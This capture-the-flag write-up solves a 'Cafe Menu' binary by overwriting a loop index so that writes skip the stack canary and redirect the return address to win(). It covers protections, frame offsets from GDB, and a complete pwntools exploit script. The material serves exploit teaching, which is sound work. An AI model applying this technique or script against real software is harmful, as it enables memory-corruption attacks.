## Cafe Menu - ret2win via Index Corruption with Canary Skip

This challenge reaches `win()` without ever leaking or brute-forcing the canary, which is the more interesting aspect of it. The struct layout inside `vuln()` places the loop counter `idx` immediately after the input buffer `menu` in memory, and since the loop uses `idx` as a write index into `menu`, sending enough bytes overwrites `idx` itself, which lets the subsequent writes skip past the canary and land directly on the saved return address.

### Phase 0 - Challenge Triage

The binary sub-category is a stack buffer overflow with canary skip achieved by corrupting the loop index variable `idx`, which sits immediately after `menu` in the same struct. The artifacts provided are the `cafe_menu` ELF binary and its C source `main.c`. The initial hypothesis is: this challenge looks like a ret2win via index corruption because `idx` is declared right after `menu` inside the struct in `vuln()`, meaning the 49th byte of input overwrites the low byte of `idx` and can redirect where the loop writes next, jumping clean over the canary and placing `win()`'s address directly on the saved RIP slot.

### Phase 1 - Reconnaissance & Enumeration

```bash
checksec --file ./cafe_menu
```

|Protection|Status|Implication|
|---|---|---|
|Canary|✅ Enabled|A canary sits between the locals and saved RIP, but since the index corruption skips it entirely, its value is irrelevant and never needs to be read or preserved|
|NX|✅ Enabled|Shellcode injection into `menu` is not possible, so execution must be redirected to the existing `win()` function|
|PIE|❌ Not found|The address of `win()` is static and fixed for every run, so `exe.sym.win` resolves to a usable address without any leak|
|RELRO|Partial|GOT entries are writable, but no GOT overwrite is needed for this exploit|

Reading `main.c` reveals that `vuln()` declares a local struct with a 48-byte `char menu[48]` field followed immediately by a `volatile unsigned int idx` field, and the loop writes one byte at a time to `data.menu[data.idx]` before incrementing `data.idx`, with the loop terminating only when the byte `0xff` is received.

### Phase 2 - Vulnerability Identification

The vulnerability is an index corruption leading to an arbitrary write anywhere on the stack above the struct. The loop in `vuln()` writes a single byte to `data.menu[data.idx]` on each iteration and then increments `data.idx`, but it performs no bounds check on `idx`, so as long as the caller keeps sending bytes other than `0xff`, the index can be driven to any value. Because `idx` is stored at offset 48 from `menu[0]` (immediately after the 48-byte buffer), the 49th byte of the payload overwrites the low byte of `idx` directly. Setting that byte to `0x47` (71) means the loop increments `idx` to 72 on the very next iteration, which is precisely the offset of the saved RIP from `menu[0]`, and the canary at offset 56 is never touched because no byte is ever written to that slot.

### Phase 3 - Exploitation Plan

```
TARGET VULNERABILITY: Loop index corruption via struct layout (idx adjacent to menu)
GOAL: Redirect saved RIP to win() without reading or restoring the canary
APPROACH:
  Step 1: Send 48 bytes of b'A' to fill menu[0..47] completely
  Step 2: Send \x47 to overwrite the low byte of idx with 71; after the loop's idx++, idx becomes 72
  Step 3: Send the 8-byte little-endian address of win(), which the loop writes one byte at a time to menu[72..79] = saved RIP
  Step 4: Send \xff to terminate the loop and let the function return to win()
TOOLS: pwntools, GDB + pwndbg, nm
RISK OF FAILURE: incorrect frame size assumption would shift the RIP offset; idx byte value must be exactly 71 (0x47) so that idx++ yields 72 before the first RIP byte is written
```

### Phase 4 - Exploit Development

#### Reading the Frame Layout from the Disassembly

Opening GDB and breaking at `vuln()` exposes two instructions that determine the full stack layout:

```
sub rsp, 0x50              ← total frame is 0x50 = 80 bytes
mov dword ptr [rbp - 0x10], 0   ← idx = 0, so idx lives at rbp−0x10
```

From these two facts the layout follows directly: `menu[0]` lives at `rbp − 0x40` (the bottom of the 80-byte frame), `idx` lives at `rbp − 0x10`, the canary lives at `rbp − 0x08`, saved RBP is at `rbp + 0x00`, and saved RIP is at `rbp + 0x08`. The offset from `menu[0]` to saved RIP is therefore `(rbp + 0x08) − (rbp − 0x40) = 0x48 = 72`, which confirms `OFFSET_TO_RIP = 72`. Since `idx` is at offset 48, byte 49 of the payload is the low byte of `idx`, and setting it to `0x47` (71) means the loop increments it to 72 on the next cycle, placing the next write exactly on saved RIP and leaving the canary at offset 56 completely untouched.

#### Recovering the Address of win()

Because PIE is disabled, `win()` has a fixed virtual address that `exe.sym.win` resolves directly from the symbol table at load time, with no runtime leak required:

```bash
nm ./cafe_menu | grep win
```

#### Confirming the Stack Alignment is Not Required

The working exploit sends `p64(exe.sym.win)` directly after the index byte with no intervening `ret` gadget, and the exploit succeeds, which confirms that `win()` in this binary does not execute a `movaps` instruction that would require 16-byte stack alignment. The `GADGET` constant that appeared in an earlier draft is therefore unused and is removed from the final script.

#### Known Values Summary

|What|Value|
|---|---|
|`OFFSET_TO_RIP`|72 (`0x48`)|
|Offset of `idx` from `menu[0]`|48|
|Byte to overwrite `idx` low byte|`0x47` (so `idx++` yields 72)|
|`win()` address|`exe.sym.win` (static, resolved at load time)|

### The Exploit

```python
#!/usr/bin/env python3
from pwn import *

exe = ELF('./cafe_menu')
context.binary = exe
context.arch   = 'amd64'
context.os     = 'linux'

HOSTNAME = 'HOSTNAME_PLACEHOLDER'
PORT     = 0  # PORT_PLACEHOLDER

# ── offsets ───────────────────────────────────────────────────────────────────
OFFSET_TO_RIP = 72

def conn():
    if args.LOCAL:
        return process(exe.path)
    return remote(HOSTNAME, PORT)

def main():
    r = conn()

    # ── exploit phase ─────────────────────────────────────────────────────────
    r.recvuntil(b"Enter today's specials (send 0xff to finish):")

    payload = flat(
        b'A' * 48,          # fill menu[0..47] completely
        b'\x47',            # overwrite idx low byte; after idx++, idx = 72
        p64(exe.sym.win),   # 8 bytes written one-by-one to menu[72..79] = saved RIP
        b'\xff',            # terminate the loop and trigger the return
    )
    r.send(payload)
    r.interactive()

if __name__ == '__main__':
    main()
```

`r.send()` is used instead of `r.sendline()` because the loop reads raw bytes one at a time and a trailing newline would be interpreted as an extra input byte, potentially corrupting the write sequence.